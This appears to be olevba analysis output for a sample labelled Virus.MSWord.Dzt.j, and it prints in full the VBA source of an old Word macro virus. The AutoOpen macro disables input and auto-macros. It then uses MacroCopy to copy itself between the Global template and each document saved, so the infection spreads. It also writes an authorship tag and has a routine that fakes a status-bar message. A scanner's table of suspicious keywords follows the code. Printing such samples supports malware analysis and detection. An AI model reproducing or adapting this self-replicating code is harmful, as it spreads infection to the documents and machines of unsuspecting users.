olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dzt.j-0b3d956ad024ff500a19f07803817f1259cc8e71
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dzt.j-0b3d956ad024ff500a19f07803817f1259cc8e71 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Dzt.j-0b3d956ad024ff500a19f07803817f1259cc8e71 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim formatfile, salah
Dim Filebaru$, Cek$

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sqlah
formatfile = 0
salah = 0
Filebaru$ = ""
Cek$ = ""
NoAuto
On Error GoTo -1: On Error GoTo finish
Cek$ = WordBasic.[FileNameFromWindow$]()
If WordBasic.IsMacro() Then
    WordBasic.FileSave
    GoTo finish
End If
ulang:
SaveTo
If sqlah = 1059 Then
    Cek$ = ""
    GoTo ulang
End If
finish:
If Err.Number = 509 Then WordBasic.Call "PrintDisqble"
End Sub

Private Sub NoAuto()
On Error GoTo -1: On Error GoTo finish
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
finish:
End Sub

Private Sub SaveTo()
On Error GoTo -1: On Error GoTo finish
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If Cek$ = "" Then WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
formatfile = dlg.Format
Filebaru$ = WordBasic.[FileName$]()
If formatfile = 1 Then CopyToFile
If salah = 0 Then
    If formatfile = 1 Then Aksi
    WordBasic.FileSaveAs dlg
End If
finish:
salah = Err.Number
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyFSAF
End If
If salah <> 0 Then
    CopyFSG
    CopyFSAG
End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSave", Filebaru$ + ":AutoOpen", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyFSG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyFSAG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":FileSaveAs", "Global:FileSaveAs", 1
finish:
End Sub

Private Sub CopyFSAF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSaveAs", Filebaru$ + ":FileSaveAs", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT"
WordBasic.SetDocumentVar "Dzutaqshiri", "(c)Hikmat Sudrajat, Bandung, April 1996"
finish:
End Sub

Private Sub PrintDisable()
On Error GoTo -1: On Error GoTo finish
WordBasic.PrintStatusBar "This command is not available because a document window is not active"
finish:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

